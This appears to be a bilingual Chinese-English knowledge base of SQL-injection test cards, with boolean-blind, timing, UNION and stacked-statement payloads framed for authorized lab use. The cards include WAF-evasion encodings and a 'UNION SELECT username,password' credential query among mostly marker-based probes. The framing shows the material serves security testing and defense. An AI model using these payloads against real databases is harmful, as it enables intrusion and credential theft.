description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

title.zh: 固定 Marker 布尔盲注差分受控变体
title.en: Fixed-Marker Boolean Blind Differential Controlled Variant

wafBypass.command:
' AND (CASE WHEN (MID(database(),1,1)='a') THEN 1 ELSE 0 END)=1--
' AND LEFT(database(),1)>'a'--
' AND RIGHT(LEFT(database(),2),1)='d'--
' AND ORD(MID(database(),1,1))BETWEEN 97 AND 122--
' AND (SELECT CONV(HEX(SUBSTR('PAYLOADER_MARKER',1,1)),16,10))>96-- -
' AND (SELECT ORD(MID('PAYLOADER_MARKER',1,1))&0x40)=0x40-- -
' AND ORD(MID('PAYLOADER_MARKER',1,1))>96-- -
' AND (SELECT LENGTH('PAYLOADER_MARKER'))>0-- -

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: 固定 Marker 布尔盲注差分从原集合中独立出来，因为其成立条件依赖特定语句语义、DBMS 或传输解析链。来源行保持守恒，但只能在隔离环境验证。
overview.en: Fixed-Marker Boolean Blind Differential is isolated because its validity depends on specific statement semantics, a DBMS, or a transport parser chain. Source lines remain conserved but may be validated only in an isolated environment.

vulnerability.zh: 风险成立需要输入在固定 Marker 布尔盲注差分路径中越过预期绑定、解析或授权边界，并由同一请求的后端证据确认。HTTP 200、延迟、关键字回显或语法错误本身均不足。
vulnerability.en: A finding requires input to cross the expected binding, parsing, or authorization boundary in the Fixed-Marker Boolean Blind Differential path and be confirmed by backend evidence for the same request. HTTP 200, delay, keyword reflection, or syntax errors alone are insufficient.

exploitation.zh: 先建立固定 marker 对照，再一次只改变一个条件、表达式或载体。延迟限制为一秒，HTTP 载体只发送 localhost marker；在首个充分证据后停止。
exploitation.en: Establish fixed-marker controls first, then change only one condition, expression, or carrier at a time. Limit delays to one second, send HTTP carriers only to a localhost marker endpoint, and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和严格类型 schema，在边缘统一 HTTP 分帧、内容类型和重复参数规则，拒绝歧义编码，并让 WAF 只承担纵深防御。
mitigation.en: Use parameterized queries and strict type schemas, normalize HTTP framing, content types, and duplicate-parameter rules at the edge, reject ambiguous encodings, and keep the WAF as defense in depth only.

title.zh: 限定固定 Marker 布尔盲注差分前提
title.en: Constrain Fixed-Marker Boolean Blind Differential prerequisites

description.zh: 确认固定 Marker 布尔盲注差分对应的实现、版本、语句或传输上下文及隔离证据源均已记录。
description.en: Record the implementation, version, statement or transport context, and isolated evidence source required by Fixed-Marker Boolean Blind Differential.

title.zh: 提交固定 Marker 布尔盲注差分主输入
title.en: Submit the Fixed-Marker Boolean Blind Differential primary input

description.zh: 仅提交 execution[0] 的审校输入，并为本次请求绑定唯一 marker、连接和审计标识。
description.en: Submit only the reviewed execution[0] input and bind a unique marker, connection, and audit identifier to the request.

title.zh: 对照固定 Marker 布尔盲注差分变体
title.en: Compare the Fixed-Marker Boolean Blind Differential variant

description.zh: 仅在主路径已建立基线后使用 wafBypass[0]，记录原始字节、解析参数和最终语句。
description.en: Use wafBypass[0] only after the primary path has a baseline, recording raw bytes, parsed parameters, and the final statement.

title.zh: 关联固定 Marker 布尔盲注差分证据
title.en: Correlate Fixed-Marker Boolean Blind Differential evidence

description.zh: 关联同一 marker 的入口值、解析结果、最终 SQL、响应差分和服务端事件，排除回显、普通错误与其他分支。
description.en: Correlate the same marker across the entry value, parsed result, final SQL, response differential, and server event, excluding reflection, ordinary errors, and other branches.

title.zh: 关闭固定 Marker 布尔盲注差分异常路径
title.en: Close the Fixed-Marker Boolean Blind Differential abnormal path

description.zh: 恢复参数化、严格分帧和最小权限，删除测试 marker 与临时状态，再重放阴性及正常业务基线。
description.en: Restore parameterization, strict framing, and least privilege, remove test markers and temporary state, then replay negative and normal business baselines.

analysis.zh: 固定 Marker 布尔盲注差分的阳性必须由同一 marker 的解析差分与最终后端行为共同证明；本地工具输出、普通超时、连接关闭、错误页和另一 DBMS 的成功语句均是假阳性。
analysis.en: A positive for Fixed-Marker Boolean Blind Differential requires the parsing differential and final backend behavior for the same marker. Local tool output, ordinary timeouts, connection closure, error pages, and successful statements on another DBMS are false positives.

opsecTips.zh: 出现连接错位、锁等待、生产数据、真实外连、日志或 CPU 激增、缓存污染或用户流量影响时立即停止。
opsecTips.en: Stop immediately on connection desynchronization, lock waits, production data, real egress, log or CPU spikes, cache contamination, or user-traffic impact.

opsecTips.zh: 测试后排空连接，删除 marker、临时表与抓包，清理代理/WAF/应用缓存，并确认参数化查询和正常请求均已恢复。
opsecTips.en: After testing, drain connections, remove markers, temporary tables, and captures, clear proxy, WAF, and application caches, and confirm parameterized queries and normal requests are restored.

name.zh: localhost 布尔盲注检测工作流

description.zh: 仅对本机隔离端点运行低风险布尔检测；第二行固定记录范围与禁止枚举约束。
description.en: Run low-risk Boolean detection only against the isolated localhost endpoint; the second line records scope and the no-enumeration constraint.

name.zh: MySQL 一秒固定 Marker 延迟

description.zh: 将原混合条目中属于MySQL 一秒固定 Marker 延迟的每一行独立路由，明确语法或载体前提、证据链与假阳性边界。
description.en: Routes every source line belonging to MySQL One-Second Fixed-Marker Delay into one focused card with explicit syntax or carrier prerequisites, evidence chains, and false-positive boundaries.

subCategory.zh: MySQL 一秒固定 Marker 延迟

prerequisites.zh: 仅在隔离实例确认MySQL 一秒固定 Marker 延迟所需 DBMS、驱动、代理或解析器行为，不跨技术分支推断结果。
prerequisites.en: Confirm the DBMS, driver, proxy, or parser behavior required by MySQL One-Second Fixed-Marker Delay in an isolated instance and do not infer results across technique branches.

prerequisites.zh: 准备固定 PAYLOADER_MARKER、阴性/阳性对照、最终语句或原始字节日志及短超时；真实数据和生产流量不得使用。
prerequisites.en: Prepare a fixed PAYLOADER_MARKER, negative and positive controls, final-statement or raw-byte logs, and short timeouts; do not use real data or production traffic.

title.zh: MySQL 一秒固定 Marker 延迟主验证命令
title.en: MySQL One-Second Fixed-Marker Delay Primary Validation

execution.command:
' AND SLEEP(1)-- -
' AND IF(1=1,SLEEP(1),0)-- -
' AND IF(1=2,SLEEP(1),0)-- -
' AND IF(LENGTH('PAYLOADER_MARKER')=1,SLEEP(1),0)-- -
' AND IF(LENGTH('PAYLOADER_MARKER')=16,SLEEP(1),0)-- -
' AND IF(ASCII(SUBSTRING('PAYLOADER_MARKER',1,1))>64,SLEEP(1),0)-- -
' AND IF(ASCII(SUBSTRING('PAYLOADER_MARKER',1,1))>96,SLEEP(1),0)-- -
SELECT SLEEP(1);

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

title.zh: MySQL 一秒固定 Marker 延迟受控变体
title.en: MySQL One-Second Fixed-Marker Delay Controlled Variant

wafBypass.command:
' AND SLEEP(1)-- -
' AND IF(1=1,SLEEP(1),0)-- -
' AND IF(1=2,SLEEP(1),0)-- -
' AND IF('PAYLOADER_MARKER' LIKE 'PAYLOADER_%',SLEEP(1),0)-- -
SELECT SLEEP(1) WHERE 1=1;

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。

name.zh: SQL Server WAITFOR 一秒延迟

description.zh: 将原混合条目中属于SQL Server WAITFOR 一秒延迟的每一行独立路由，明确语法或载体前提、证据链与假阳性边界。
description.en: Routes every source line belonging to SQL Server WAITFOR One-Second Delay into one focused card with explicit syntax or carrier prerequisites, evidence chains, and false-positive boundaries.

subCategory.zh: SQL Server WAITFOR 一秒延迟

prerequisites.zh: 仅在隔离实例确认SQL Server WAITFOR 一秒延迟所需 DBMS、驱动、代理或解析器行为，不跨技术分支推断结果。
prerequisites.en: Confirm the DBMS, driver, proxy, or parser behavior required by SQL Server WAITFOR One-Second Delay in an isolated instance and do not infer results across technique branches.

prerequisites.zh: 准备固定 PAYLOADER_MARKER、阴性/阳性对照、最终语句或原始字节日志及短超时；真实数据和生产流量不得使用。
prerequisites.en: Prepare a fixed PAYLOADER_MARKER, negative and positive controls, final-statement or raw-byte logs, and short timeouts; do not use real data or production traffic.

title.zh: SQL Server WAITFOR 一秒延迟主验证命令
title.en: SQL Server WAITFOR One-Second Delay Primary Validation

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

title.zh: SQL Server WAITFOR 一秒延迟受控变体
title.en: SQL Server WAITFOR One-Second Delay Controlled Variant

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: SQL Server WAITFOR 一秒延迟从原集合中独立出来，因为其成立条件依赖特定语句语义、DBMS 或传输解析链。来源行保持守恒，但只能在隔离环境验证。
overview.en: SQL Server WAITFOR One-Second Delay is isolated because its validity depends on specific statement semantics, a DBMS, or a transport parser chain. Source lines remain conserved but may be validated only in an isolated environment.

vulnerability.zh: 风险成立需要输入在SQL Server WAITFOR 一秒延迟路径中越过预期绑定、解析或授权边界，并由同一请求的后端证据确认。HTTP 200、延迟、关键字回显或语法错误本身均不足。
vulnerability.en: A finding requires input to cross the expected binding, parsing, or authorization boundary in the SQL Server WAITFOR One-Second Delay path and be confirmed by backend evidence for the same request. HTTP 200, delay, keyword reflection, or syntax errors alone are insufficient.

exploitation.zh: 先建立固定 marker 对照，再一次只改变一个条件、表达式或载体。延迟限制为一秒，HTTP 载体只发送 localhost marker；在首个充分证据后停止。
exploitation.en: Establish fixed-marker controls first, then change only one condition, expression, or carrier at a time. Limit delays to one second, send HTTP carriers only to a localhost marker endpoint, and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和严格类型 schema，在边缘统一 HTTP 分帧、内容类型和重复参数规则，拒绝歧义编码，并让 WAF 只承担纵深防御。
mitigation.en: Use parameterized queries and strict type schemas, normalize HTTP framing, content types, and duplicate-parameter rules at the edge, reject ambiguous encodings, and keep the WAF as defense in depth only.

title.zh: 限定SQL Server WAITFOR 一秒延迟前提
title.en: Constrain SQL Server WAITFOR One-Second Delay prerequisites

description.zh: 确认SQL Server WAITFOR 一秒延迟对应的实现、版本、语句或传输上下文及隔离证据源均已记录。
description.en: Record the implementation, version, statement or transport context, and isolated evidence source required by SQL Server WAITFOR One-Second Delay.

title.zh: 提交SQL Server WAITFOR 一秒延迟主输入
title.en: Submit the SQL Server WAITFOR One-Second Delay primary input

description.zh: 仅提交 execution[0] 的审校输入，并为本次请求绑定唯一 marker、连接和审计标识。
description.en: Submit only the reviewed execution[0] input and bind a unique marker, connection, and audit identifier to the request.

title.zh: 对照SQL Server WAITFOR 一秒延迟变体
title.en: Compare the SQL Server WAITFOR One-Second Delay variant

description.zh: 仅在主路径已建立基线后使用 wafBypass[0]，记录原始字节、解析参数和最终语句。
description.en: Use wafBypass[0] only after the primary path has a baseline, recording raw bytes, parsed parameters, and the final statement.

title.zh: 关联SQL Server WAITFOR 一秒延迟证据
title.en: Correlate SQL Server WAITFOR One-Second Delay evidence

description.zh: 关联同一 marker 的入口值、解析结果、最终 SQL、响应差分和服务端事件，排除回显、普通错误与其他分支。
description.en: Correlate the same marker across the entry value, parsed result, final SQL, response differential, and server event, excluding reflection, ordinary errors, and other branches.

title.zh: 关闭SQL Server WAITFOR 一秒延迟异常路径
title.en: Close the SQL Server WAITFOR One-Second Delay abnormal path

description.zh: 恢复参数化、严格分帧和最小权限，删除测试 marker 与临时状态，再重放阴性及正常业务基线。
description.en: Restore parameterization, strict framing, and least privilege, remove test markers and temporary state, then replay negative and normal business baselines.

analysis.zh: SQL Server WAITFOR 一秒延迟的阳性必须由同一 marker 的解析差分与最终后端行为共同证明；本地工具输出、普通超时、连接关闭、错误页和另一 DBMS 的成功语句均是假阳性。
analysis.en: A positive for SQL Server WAITFOR One-Second Delay requires the parsing differential and final backend behavior for the same marker. Local tool output, ordinary timeouts, connection closure, error pages, and successful statements on another DBMS are false positives.

opsecTips.zh: 出现连接错位、锁等待、生产数据、真实外连、日志或 CPU 激增、缓存污染或用户流量影响时立即停止。
opsecTips.en: Stop immediately on connection desynchronization, lock waits, production data, real egress, log or CPU spikes, cache contamination, or user-traffic impact.

opsecTips.zh: 测试后排空连接，删除 marker、临时表与抓包，清理代理/WAF/应用缓存，并确认参数化查询和正常请求均已恢复。
opsecTips.en: After testing, drain connections, remove markers, temporary tables, and captures, clear proxy, WAF, and application caches, and confirm parameterized queries and normal requests are restored.

execution.command:
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
' UNION SELECT 'PAYLOADER_MARKER'-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT 'PAYLOADER_MARKER',NULL,NULL-- -
' UNION SELECT NULL,'PAYLOADER_MARKER',NULL-- -
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' UnIoN SeLeCt 1,2,3--
' UNION/**/SELECT/**/1,2,3--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。

' /*!50000UNION*/ /*!50000SELECT*/ 1,database(),3--
' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3--
' uNiOn%23%0aSeLeCt 1,2,3--
' UNION%0a%09%0d%0bSELECT%0a1,2,3--
' UNION SELECT 1,'PAYLOADER_MARKER',3-- -

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: UNION 列对齐与只读查询变体从原集合中独立出来，因为其成立条件依赖特定语句语义、DBMS 或传输解析链。来源行保持守恒，但只能在隔离环境验证。
overview.en: UNION Column Alignment and Read-Only Query Variants is isolated because its validity depends on specific statement semantics, a DBMS, or a transport parser chain. Source lines remain conserved but may be validated only in an isolated environment.

vulnerability.zh: 风险成立需要输入在UNION 列对齐与只读查询变体路径中越过预期绑定、解析或授权边界，并由同一请求的后端证据确认。HTTP 200、延迟、关键字回显或语法错误本身均不足。
vulnerability.en: A finding requires input to cross the expected binding, parsing, or authorization boundary in the UNION Column Alignment and Read-Only Query Variants path and be confirmed by backend evidence for the same request. HTTP 200, delay, keyword reflection, or syntax errors alone are insufficient.

exploitation.zh: 先建立固定 marker 对照，再一次只改变一个条件、表达式或载体。延迟限制为一秒，HTTP 载体只发送 localhost marker；在首个充分证据后停止。
exploitation.en: Establish fixed-marker controls first, then change only one condition, expression, or carrier at a time. Limit delays to one second, send HTTP carriers only to a localhost marker endpoint, and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和严格类型 schema，在边缘统一 HTTP 分帧、内容类型和重复参数规则，拒绝歧义编码，并让 WAF 只承担纵深防御。
mitigation.en: Use parameterized queries and strict type schemas, normalize HTTP framing, content types, and duplicate-parameter rules at the edge, reject ambiguous encodings, and keep the WAF as defense in depth only.

title.zh: 限定UNION 列对齐与只读查询变体前提
title.en: Constrain UNION Column Alignment and Read-Only Query Variants prerequisites

description.zh: 确认UNION 列对齐与只读查询变体对应的实现、版本、语句或传输上下文及隔离证据源均已记录。
description.en: Record the implementation, version, statement or transport context, and isolated evidence source required by UNION Column Alignment and Read-Only Query Variants.

title.zh: 提交UNION 列对齐与只读查询变体主输入
title.en: Submit the UNION Column Alignment and Read-Only Query Variants primary input

description.zh: 仅提交 execution[0] 的审校输入，并为本次请求绑定唯一 marker、连接和审计标识。
description.en: Submit only the reviewed execution[0] input and bind a unique marker, connection, and audit identifier to the request.

title.zh: 对照UNION 列对齐与只读查询变体变体
title.en: Compare the UNION Column Alignment and Read-Only Query Variants variant

description.zh: 仅在主路径已建立基线后使用 wafBypass[0]，记录原始字节、解析参数和最终语句。
description.en: Use wafBypass[0] only after the primary path has a baseline, recording raw bytes, parsed parameters, and the final statement.

title.zh: 关联UNION 列对齐与只读查询变体证据
title.en: Correlate UNION Column Alignment and Read-Only Query Variants evidence

description.zh: 关联同一 marker 的入口值、解析结果、最终 SQL、响应差分和服务端事件，排除回显、普通错误与其他分支。
description.en: Correlate the same marker across the entry value, parsed result, final SQL, response differential, and server event, excluding reflection, ordinary errors, and other branches.

title.zh: 关闭UNION 列对齐与只读查询变体异常路径
title.en: Close the UNION Column Alignment and Read-Only Query Variants abnormal path

description.zh: 恢复参数化、严格分帧和最小权限，删除测试 marker 与临时状态，再重放阴性及正常业务基线。
description.en: Restore parameterization, strict framing, and least privilege, remove test markers and temporary state, then replay negative and normal business baselines.

analysis.zh: UNION 列对齐与只读查询变体的阳性必须由同一 marker 的解析差分与最终后端行为共同证明；本地工具输出、普通超时、连接关闭、错误页和另一 DBMS 的成功语句均是假阳性。
analysis.en: A positive for UNION Column Alignment and Read-Only Query Variants requires the parsing differential and final backend behavior for the same marker. Local tool output, ordinary timeouts, connection closure, error pages, and successful statements on another DBMS are false positives.

opsecTips.zh: 出现连接错位、锁等待、生产数据、真实外连、日志或 CPU 激增、缓存污染或用户流量影响时立即停止。
opsecTips.en: Stop immediately on connection desynchronization, lock waits, production data, real egress, log or CPU spikes, cache contamination, or user-traffic impact.

opsecTips.zh: 测试后排空连接，删除 marker、临时表与抓包，清理代理/WAF/应用缓存，并确认参数化查询和正常请求均已恢复。
opsecTips.en: After testing, drain connections, remove markers, temporary tables, and captures, clear proxy, WAF, and application caches, and confirm parameterized queries and normal requests are restored.

title.en: Submit the SQL Server Stacked-Statement Boundary primary input

description.zh: 仅提交 execution[0] 的审校输入，并为本次请求绑定唯一 marker、连接和审计标识。
description.en: Submit only the reviewed execution[0] input and bind a unique marker, connection, and audit identifier to the request.

title.zh: 对照SQL Server 堆叠语句边界变体
title.en: Compare the SQL Server Stacked-Statement Boundary variant

description.zh: 仅在主路径已建立基线后使用 wafBypass[0]，记录原始字节、解析参数和最终语句。
description.en: Use wafBypass[0] only after the primary path has a baseline, recording raw bytes, parsed parameters, and the final statement.

title.zh: 关联SQL Server 堆叠语句边界证据
title.en: Correlate SQL Server Stacked-Statement Boundary evidence

description.zh: 关联同一 marker 的入口值、解析结果、最终 SQL、响应差分和服务端事件，排除回显、普通错误与其他分支。
description.en: Correlate the same marker across the entry value, parsed result, final SQL, response differential, and server event, excluding reflection, ordinary errors, and other branches.

title.zh: 关闭SQL Server 堆叠语句边界异常路径
title.en: Close the SQL Server Stacked-Statement Boundary abnormal path

description.zh: 恢复参数化、严格分帧和最小权限，删除测试 marker 与临时状态，再重放阴性及正常业务基线。
description.en: Restore parameterization, strict framing, and least privilege, remove test markers and temporary state, then replay negative and normal business baselines.

analysis.zh: SQL Server 堆叠语句边界的阳性必须由同一 marker 的解析差分与最终后端行为共同证明；本地工具输出、普通超时、连接关闭、错误页和另一 DBMS 的成功语句均是假阳性。
analysis.en: A positive for SQL Server Stacked-Statement Boundary requires the parsing differential and final backend behavior for the same marker. Local tool output, ordinary timeouts, connection closure, error pages, and successful statements on another DBMS are false positives.

opsecTips.zh: 出现连接错位、锁等待、生产数据、真实外连、日志或 CPU 激增、缓存污染或用户流量影响时立即停止。
opsecTips.en: Stop immediately on connection desynchronization, lock waits, production data, real egress, log or CPU spikes, cache contamination, or user-traffic impact.

opsecTips.zh: 测试后排空连接，删除 marker、临时表与抓包，清理代理/WAF/应用缓存，并确认参数化查询和正常请求均已恢复。
opsecTips.en: After testing, drain connections, remove markers, temporary tables, and captures, clear proxy, WAF, and application caches, and confirm parameterized queries and normal requests are restored.

name.zh: PostgreSQL 堆叠语句边界

description.zh: 将原混合条目中属于PostgreSQL 堆叠语句边界的每一行独立路由，明确语法或载体前提、证据链与假阳性边界。
description.en: Routes every source line belonging to PostgreSQL Stacked-Statement Boundary into one focused card with explicit syntax or carrier prerequisites, evidence chains, and false-positive boundaries.

prerequisites.zh: 仅在隔离实例确认PostgreSQL 堆叠语句边界所需 DBMS、驱动、代理或解析器行为，不跨技术分支推断结果。
prerequisites.en: Confirm the DBMS, driver, proxy, or parser behavior required by PostgreSQL Stacked-Statement Boundary in an isolated instance and do not infer results across technique branches.

prerequisites.zh: 准备固定 PAYLOADER_MARKER、阴性/阳性对照、最终语句或原始字节日志及短超时；真实数据和生产流量不得使用。
prerequisites.en: Prepare a fixed PAYLOADER_MARKER, negative and positive controls, final-statement or raw-byte logs, and short timeouts; do not use real data or production traffic.

title.zh: PostgreSQL 堆叠语句边界主验证命令

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

title.zh: PostgreSQL 堆叠语句边界受控变体

wafBypass.command:
'; SELECT pg_sleep(1) WHERE 1=1;--
'; DO $$ BEGIN RAISE NOTICE 'PAYLOADER_MARKER'; END $$;--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: PostgreSQL 堆叠语句边界从原集合中独立出来，因为其成立条件依赖特定语句语义、DBMS 或传输解析链。来源行保持守恒，但只能在隔离环境验证。
overview.en: PostgreSQL Stacked-Statement Boundary is isolated because its validity depends on specific statement semantics, a DBMS, or a transport parser chain. Source lines remain conserved but may be validated only in an isolated environment.

vulnerability.zh: 风险成立需要输入在PostgreSQL 堆叠语句边界路径中越过预期绑定、解析或授权边界，并由同一请求的后端证据确认。HTTP 200、延迟、关键字回显或语法错误本身均不足。
vulnerability.en: A finding requires input to cross the expected binding, parsing, or authorization boundary in the PostgreSQL Stacked-Statement Boundary path and be confirmed by backend evidence for the same request. HTTP 200, delay, keyword reflection, or syntax errors alone are insufficient.

exploitation.zh: 先建立固定 marker 对照，再一次只改变一个条件、表达式或载体。延迟限制为一秒，HTTP 载体只发送 localhost marker；在首个充分证据后停止。
exploitation.en: Establish fixed-marker controls first, then change only one condition, expression, or carrier at a time. Limit delays to one second, send HTTP carriers only to a localhost marker endpoint, and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和严格类型 schema，在边缘统一 HTTP 分帧、内容类型和重复参数规则，拒绝歧义编码，并让 WAF 只承担纵深防御。
mitigation.en: Use parameterized queries and strict type schemas, normalize HTTP framing, content types, and duplicate-parameter rules at the edge, reject ambiguous encodings, and keep the WAF as defense in depth only.

execution.command:
'; BEGIN; CREATE TEMP TABLE payloader_marker(value text) ON COMMIT DROP; INSERT INTO payloader_marker(value) VALUES ('PAYLOADER_MARKER'); SELECT value FROM payloader_marker; ROLLBACK;--
'; BEGIN; CREATE TEMP TABLE payloader_marker(value text) ON COMMIT DROP; INSERT INTO payloader_marker(value) VALUES ('PAYLOADER_MARKER'); UPDATE payloader_marker SET value='PAYLOADER_MARKER_UPDATED'; SELECT value FROM payloader_marker; ROLLBACK;--
'; BEGIN; CREATE TEMP TABLE payloader_marker(value text) ON COMMIT DROP; INSERT INTO payloader_marker(value) VALUES ('PAYLOADER_MARKER'); DELETE FROM payloader_marker; SELECT COUNT(*) FROM payloader_marker; ROLLBACK;--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: HTTP 重复参数载体从原集合中独立出来，因为其成立条件依赖特定语句语义、DBMS 或传输解析链。来源行保持守恒，但只能在隔离环境验证。
overview.en: HTTP Duplicate-Parameter Carrier is isolated because its validity depends on specific statement semantics, a DBMS, or a transport parser chain. Source lines remain conserved but may be validated only in an isolated environment.

vulnerability.zh: 风险成立需要输入在HTTP 重复参数载体路径中越过预期绑定、解析或授权边界，并由同一请求的后端证据确认。HTTP 200、延迟、关键字回显或语法错误本身均不足。
vulnerability.en: A finding requires input to cross the expected binding, parsing, or authorization boundary in the HTTP Duplicate-Parameter Carrier path and be confirmed by backend evidence for the same request. HTTP 200, delay, keyword reflection, or syntax errors alone are insufficient.

exploitation.zh: 先建立固定 marker 对照，再一次只改变一个条件、表达式或载体。延迟限制为一秒，HTTP 载体只发送 localhost marker；在首个充分证据后停止。
exploitation.en: Establish fixed-marker controls first, then change only one condition, expression, or carrier at a time. Limit delays to one second, send HTTP carriers only to a localhost marker endpoint, and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和严格类型 schema，在边缘统一 HTTP 分帧、内容类型和重复参数规则，拒绝歧义编码，并让 WAF 只承担纵深防御。
mitigation.en: Use parameterized queries and strict type schemas, normalize HTTP framing, content types, and duplicate-parameter rules at the edge, reject ambiguous encodings, and keep the WAF as defense in depth only.

title.zh: 限定HTTP 重复参数载体前提

description.zh: 确认HTTP 重复参数载体对应的实现、版本、语句或传输上下文及隔离证据源均已记录。
description.en: Record the implementation, version, statement or transport context, and isolated evidence source required by HTTP Duplicate-Parameter Carrier.

title.zh: 提交HTTP 重复参数载体主输入
title.en: Submit the HTTP Duplicate-Parameter Carrier primary input

description.zh: 仅提交 execution[0] 的审校输入，并为本次请求绑定唯一 marker、连接和审计标识。
description.en: Submit only the reviewed execution[0] input and bind a unique marker, connection, and audit identifier to the request.

title.zh: 关联HTTP 重复参数载体证据

description.zh: 关联同一 marker 的入口值、解析结果、最终 SQL、响应差分和服务端事件，排除回显、普通错误与其他分支。
description.en: Correlate the same marker across the entry value, parsed result, final SQL, response differential, and server event, excluding reflection, ordinary errors, and other branches.

title.zh: 关闭HTTP 重复参数载体异常路径
title.en: Close the HTTP Duplicate-Parameter Carrier abnormal path

description.zh: 恢复参数化、严格分帧和最小权限，删除测试 marker 与临时状态，再重放阴性及正常业务基线。
description.en: Restore parameterization, strict framing, and least privilege, remove test markers and temporary state, then replay negative and normal business baselines.

analysis.zh: HTTP 重复参数载体的阳性必须由同一 marker 的解析差分与最终后端行为共同证明；本地工具输出、普通超时、连接关闭、错误页和另一 DBMS 的成功语句均是假阳性。
analysis.en: A positive for HTTP Duplicate-Parameter Carrier requires the parsing differential and final backend behavior for the same marker. Local tool output, ordinary timeouts, connection closure, error pages, and successful statements on another DBMS are false positives.

opsecTips.zh: 出现连接错位、锁等待、生产数据、真实外连、日志或 CPU 激增、缓存污染或用户流量影响时立即停止。
opsecTips.en: Stop immediately on connection desynchronization, lock waits, production data, real egress, log or CPU spikes, cache contamination, or user-traffic impact.

opsecTips.zh: 测试后排空连接，删除 marker、临时表与抓包，清理代理/WAF/应用缓存，并确认参数化查询和正常请求均已恢复。
opsecTips.en: After testing, drain connections, remove markers, temporary tables, and captures, clear proxy, WAF, and application caches, and confirm parameterized queries and normal requests are restored.

description.zh: 将原混合条目中属于JSON SQL Marker 载体的每一行独立路由，明确语法或载体前提、证据链与假阳性边界。
description.en: Routes every source line belonging to JSON SQL Marker Carrier into one focused card with explicit syntax or carrier prerequisites, evidence chains, and false-positive boundaries.

prerequisites.zh: 仅在隔离实例确认JSON SQL Marker 载体所需 DBMS、驱动、代理或解析器行为，不跨技术分支推断结果。
prerequisites.en: Confirm the DBMS, driver, proxy, or parser behavior required by JSON SQL Marker Carrier in an isolated instance and do not infer results across technique branches.

prerequisites.zh: 准备固定 PAYLOADER_MARKER、阴性/阳性对照、最终语句或原始字节日志及短超时；真实数据和生产流量不得使用。
prerequisites.en: Prepare a fixed PAYLOADER_MARKER, negative and positive controls, final-statement or raw-byte logs, and short timeouts; do not use real data or production traffic.

title.zh: JSON SQL Marker 载体主验证命令
title.en: JSON SQL Marker Carrier Primary Validation

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: JSON SQL Marker 载体从原集合中独立出来，因为其成立条件依赖特定语句语义、DBMS 或传输解析链。来源行保持守恒，但只能在隔离环境验证。
overview.en: JSON SQL Marker Carrier is isolated because its validity depends on specific statement semantics, a DBMS, or a transport parser chain. Source lines remain conserved but may be validated only in an isolated environment.

vulnerability.zh: 风险成立需要输入在JSON SQL Marker 载体路径中越过预期绑定、解析或授权边界，并由同一请求的后端证据确认。HTTP 200、延迟、关键字回显或语法错误本身均不足。
vulnerability.en: A finding requires input to cross the expected binding, parsing, or authorization boundary in the JSON SQL Marker Carrier path and be confirmed by backend evidence for the same request. HTTP 200, delay, keyword reflection, or syntax errors alone are insufficient.

exploitation.zh: 先建立固定 marker 对照，再一次只改变一个条件、表达式或载体。延迟限制为一秒，HTTP 载体只发送 localhost marker；在首个充分证据后停止。
exploitation.en: Establish fixed-marker controls first, then change only one condition, expression, or carrier at a time. Limit delays to one second, send HTTP carriers only to a localhost marker endpoint, and stop after the first sufficient proof.

